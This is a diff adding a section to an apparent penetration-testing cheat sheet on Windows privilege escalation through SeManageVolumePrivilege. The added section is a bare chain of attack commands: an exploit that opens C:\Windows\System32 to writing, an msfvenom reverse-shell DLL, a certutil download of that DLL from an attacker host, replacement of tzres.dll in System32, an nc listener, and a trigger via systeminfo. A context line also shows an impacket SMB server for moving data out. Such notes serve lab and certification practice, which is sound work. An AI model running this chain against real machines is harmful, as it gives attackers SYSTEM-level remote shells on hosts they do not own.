@@ -120,3 +120,46 @@ Her adım başarısız olursa pivot: diskshadow çalışmıyorsa (yazma izni hi�
 ```sh
 sudo impacket-smbserver -smb2support SendMeYoData Pass123.
 ```
+
+# SeManageVolumePrivilege
+
+- SeManageVolumePrivilege -> Enabled/Disabled
+- [SeManageVolumeExploit.exe](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)
+- Modify the write permissions on **C:\Windows\System32** -> DLL injection
+
+```sh
+.\SeManageVolumeExploit.exe
+```
+
+Check:
+```sh
+icacls C:\Windows\System32 | findstr "Everyone"
+```
+
+If not 'Full Control' -> .NET framework incompetence -> `reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s`
+
+Find the dll injection point -> [Find-HijackDLL](https://github.com/FunwayHQ/Find-HijackDLL)
+
+Select the dll -> [dllref](https://sirensecurity.io/blog/dllref/)
+
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.xxx LPORT=443 -f dll -o tzres.dll
+```
+
+```sh
+certutil -urlcache -split -f http://192.168.45.154:8000/tzres.dll tzres.dll
+```
+
+```sh
+copy tzres.dll C:\Windows\System32\tzres.dll
+```
+
+```sh
+rlwrap -cAr nc -nlvp 443
+```
+
+Trigger it (depends on DLL):
+```sh
+systeminfo
+```
+
